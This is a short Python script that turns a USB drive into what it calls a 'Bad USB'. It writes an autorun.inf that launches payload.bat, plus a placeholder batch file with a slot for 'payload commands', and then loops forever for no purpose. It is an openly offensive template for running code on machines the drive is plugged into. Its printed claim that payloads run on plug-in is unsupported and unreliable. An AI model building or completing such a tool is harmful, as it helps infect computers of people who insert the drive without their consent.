import os
import time
import sys

# Get the path of the USB flash drive
usb_path = input("Enter the path of the USB flash drive: ")

# Check if the path exists
if not os.path.exists(usb_path):
    print("The specified path does not exist.")
    sys.exit()

# Change the working directory to the USB flash drive
os.chdir(usb_path)

# Create a file called "autorun.inf" with the following content
autorun_content = """
[autorun]
open=payload.bat
action=Run the payload
label=Bad USB
icon=explorer.exe,0
"""
with open("autorun.inf", "w") as autorun_file:
    autorun_file.write(autorun_content)

# Create a batch file called "payload.bat" with the following content
payload_content = """
@echo off
echo Running the payload...
REM Insert your payload commands here
echo Payload executed successfully.
"""
with open("payload.bat", "w") as payload_file:
    payload_file.write(payload_content)

print("Bad USB created successfully!")
print("The USB flash drive will appear as an infected device.")
print("Payloads will be executed when the USB flash drive is plugged in.")

# Keep the script running to prevent it from exiting
while True:
    time.sleep(1)